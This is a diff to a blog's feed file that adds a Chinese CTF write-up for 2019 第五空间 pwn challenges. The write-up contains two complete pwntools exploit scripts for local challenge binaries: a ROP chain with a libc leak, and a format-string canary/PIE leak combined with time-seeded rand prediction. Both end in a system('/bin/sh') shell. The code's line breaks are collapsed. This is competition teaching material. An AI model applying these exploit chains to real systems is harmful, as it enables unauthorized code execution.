@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>2019第五空间pwn题解</title>
+      <link href="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/"/>
+      <url>/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/</url>
+      
+        <content type="html"><![CDATA[<p>#於讴：<br>    首先是一个简单的逆向分析<br>    <img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/1.png" title="This is an image"><br>    只要大于或等于1000即可，接下来就是一个很简单的栈溢出的ROP利用：</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#39;debug&#39;r = process(&#39;./pwn&#39;)offset = 0x18r.sendline(&#39;1000&#39;)pop_rdi_ret = 0x0000000000414fc3elf = ELF(&#39;./pwn&#39;)main_addr = 0x0000000004007C3libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]print hex(puts_plt)&#39;&#39;&#39;rop = [    pop_rdi_ret,    libc_start_main_got,    puts_plt,    main_addr,]&#39;&#39;&#39;#gdb.attach(r,&#39;b *0x0000000004007E1\nc&#39;)payload1 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(libc_start_main_got) + p64(puts_plt) + p64(main_addr)r.recvuntil(&#39;OH, WHY ARE YOU SO GOOD?\n&#39;)r.sendline(payload1)libc_start_main_addr = u64(r.recvuntil(&#39;\x7f&#39;).ljust(8,&#39;\x00&#39;))print hex(libc_start_main_addr)libc = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)libc_base = libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)system_addr = libc_base + libc.dump(&#39;system&#39;)bin_sh_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;)r.sendline(&#39;1001&#39;)payload2 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr)r.recvuntil(&#39;OH, WHY ARE YOU SO GOOD?\n&#39;)r.sendline(payload2)r.interactive()</code></pre><p>#副墨：<br>这个题目保护全开，属实是有点夸张的，但是漏洞也是比较明显吧？<br>首先见面的就是一个伪随机数的碰撞，然后我不得不吐槽一下了，题目给了格式化字符串漏洞，我们可以泄露canary 同时破解pie的保护，但是坑逼的是题目里面的system函数竟然没给’/bin/sh’字符串，而且泄露的时候不知道为啥，最多泄露的长度就是2个’%p’，那就坑逼了，你要重复泄露两次，一次拿到canary + codebase  一次拿到 一个函数的实际地址来泄露libc 进而得到libc里面的 ‘/bin/sh’字符串 。。。属实是需要很长时间的。。。。（我坑逼的调试了一整个下午。。。）<br>值得注意的是：LibcSearcher碰撞出来的libc不全是对的，要换着多执行几次脚本才能getshell啊！</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *from ctypes import *from LibcSearcher import LibcSearcherimport timecontext.log_level=&#39;debug&#39;r = process(&#39;./bf&#39;)name = &#39;%p&#39;name1 = &#39;#%17$p#%18$p&#39;r.sendline(&#39;1&#39;)libc = cdll.LoadLibrary(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)time_now = int(time.time())libc.srand(time_now)r.recvuntil(&#39;your name : \n&#39;)r.sendline(name1)#gdb.attach(r,&#39;b *0x555555554d12\nC&#39;)for i in range(10):    payload = libc.rand() % 0x1869F + 1    r.recvuntil(&#39;Round &#39;+str(i)+&#39; Now guess:&#39;)    r.sendline(str(payload))get1 = r.recv()code1 = hex(int(get1[29:43],16))cookie1 = int(get1[10:28],16)print hex(int(code1,16))print hex(cookie1)codebase = int(code1,16) - 0xd50main_addr = codebase + 0xabfpayload1 = &#39;a&#39; * 0x34 + p64(cookie1) + &#39;a&#39; * 8 +p64(main_addr)r.sendline(payload1)r.recvuntil(&#39;Are you sure want to play the game?\n&#39;)r.sendline(&#39;1&#39;)r.recvuntil(&#39;your name : \n&#39;)gdb.attach(r,&#39;b *0x555555554d12\nC&#39;)r.sendline(name)libc.srand(int(time.time()))for i in range(10):    payload = libc.rand() % 0x1869F + 1    r.recvuntil(&#39;Round &#39;+str(i)+&#39; Now guess:&#39;)    r.sendline(str(payload))get = r.recv()[9:24]_IO_2_1_stdout_addr = int(get,16) - 0x83#code = hex(int(get[10:28],16))#cookie = int(get[10:28],16)#cookie = hex(int(get[29:43],16))#libc_start_main = int(code,16) - 0xf0print &#39;stdout : &#39; +  hex(_IO_2_1_stdout_addr)libc1 = LibcSearcher(&#39;_IO_2_1_stdout_&#39;,_IO_2_1_stdout_addr)libcbase = _IO_2_1_stdout_addr - libc1.dump(&#39;_IO_2_1_stdout_&#39;)system_addr = libcbase + libc1.dump(&#39;system&#39;)print &#39;system_addr : &#39; + hex(system_addr)binsh_addr = libcbase + libc1.dump(&#39;str_bin_sh&#39;)print &#39;binsh_addr : &#39; + hex(binsh_addr)pop_rdi_ret = codebase + 0x0000000000000db3print &#39;pop_rdi_ret : &#39; + hex(pop_rdi_ret)payload1 = &#39;a&#39; * 0x34 + p64(cookie1) + &#39;a&#39; * 8 +p64(pop_rdi_ret)+p64(binsh_addr) +  p64(system_addr) r.sendline(payload1)r.interactive()</code></pre><p>纪念一下：<br>  <img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/2.png" title="This is an image"></p><p>  未完待续。。。。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF题解 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>glibc heap Fastbin Corruption</title>
       <link href="/2019/08/16/glibc-heap-fastbin-corruption/"/>
       <url>/2019/08/16/glibc-heap-fastbin-corruption/</url>
